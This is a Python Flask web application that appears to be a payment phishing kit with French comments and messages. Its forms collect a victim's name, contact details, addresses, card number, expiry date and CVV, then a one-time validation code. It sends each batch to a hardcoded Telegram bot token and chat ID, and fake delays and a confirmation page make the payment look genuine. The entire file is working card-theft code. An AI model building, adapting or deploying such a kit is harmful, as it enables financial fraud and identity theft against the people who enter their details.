from flask import Flask, request, render_template, redirect, url_for, session
import requests
import time

app = Flask(__name__)
app.secret_key = "supersecretkey"  # Nécessaire pour utiliser `session`

# Fonction pour envoyer un message Telegram
def send_telegram_message(message):
    bot_token = "8022971997:AAGj1VGrYKEXWdX6GaHIzT8nsomWYoJt8mA"  # Ton token Telegram
    chat_id = "5652184847"  # Ton ID Telegram

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message}

    response = requests.post(url, json=payload)

    if response.status_code == 200:
        print("✅ Message envoyé avec succès sur Telegram !")
    else:
        print(f"❌ Erreur lors de l'envoi du message : {response.text}")

# Route pour la page d'accueil (formulaire paiement)
@app.route('/', methods=['GET', 'POST'])
def payment_form():
    if request.method == 'POST':
        # Récupération des données du formulaire de paiement
        session['nom'] = request.form.get('nom', '').strip()
        session['prenom'] = request.form.get('prenom', '').strip()
        session['telephone'] = request.form.get('telephone', '').strip()
        session['email'] = request.form.get('email', '').strip()
        session['adresse_facturation'] = request.form.get('adresse_facturation', '').strip()
        session['adresse_livraison'] = request.form.get('adresse_livraison', '').strip()
        session['montant'] = request.form.get('montant', '').strip()

        if not all([session['nom'], session['prenom'], session['telephone'], session['email'], session['adresse_facturation'], session['adresse_livraison'], session['montant']]):
            return "❌ Erreur : Tous les champs sont obligatoires.", 400

        return redirect(url_for('credit_card_form'))
    
    return render_template('paiement.html')

# Route pour le formulaire de carte de crédit
@app.route('/credit-card', methods=['GET', 'POST'])
def credit_card_form():
    if request.method == 'POST':
        # Récupération des informations sensibles
        session['numero_carte'] = request.form.get('numero_carte', '').strip()
        session['date_expiration'] = request.form.get('date_expiration', '').strip()
        session['cvv'] = request.form.get('cvv', '').strip()

        if not all([session['numero_carte'], session['date_expiration'], session['cvv']]):
            return "❌ Erreur : Tous les champs de la carte sont obligatoires.", 400

        # Envoyer un message Telegram avec les infos de la carte
        message = f"""
        🔔 Nouvelle tentative de paiement :
        - 🏷 Nom : {session['nom']}
        - 🏷 Prénom : {session['prenom']}
        - 📞 Téléphone : {session['telephone']}
        - 📧 E-mail : {session['email']}
        - 💰 Montant : {session['montant']} €
        - 💳 Numéro de carte : {session['numero_carte']}
        - 📆 Date d'expiration : {session['date_expiration']}
        - 🔒 CVV : {session['cvv']}
        """
        send_telegram_message(message)

        # Simulation d'un délai de 30 secondes avant d'afficher la validation
        time.sleep(30)

        return redirect(url_for('validation_paiement'))

    return render_template('credit_card_form.html')

# Route pour la page de validation de paiement
@app.route('/validation', methods=['GET', 'POST'])
def validation_paiement():
    if request.method == 'POST':
        validation_code = request.form.get('validation_code')

        if not validation_code:
            return "❌ Erreur : Le code de validation est obligatoire.", 400

        # Envoyer un message Telegram avec le code de validation
        message = f"""
        🔑 Code de validation reçu :
        - 🏷 Nom : {session['nom']}
        - 💰 Montant : {session['montant']} €
        - 🔢 Code de validation : {validation_code}
        """
        send_telegram_message(message)

        # Simulation du traitement pendant 1 minute avant la confirmation
        time.sleep(60)

        return redirect(url_for('payment_confirmation'))

    return render_template('validation_paiement.html', montant=session.get('montant'))

# Route pour la page de confirmation de paiement
@app.route('/confirmation')
def payment_confirmation():
    return render_template('confirmation.html', nom=session.get('nom'), prenom=session.get('prenom'), montant=session.get('montant'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5004)
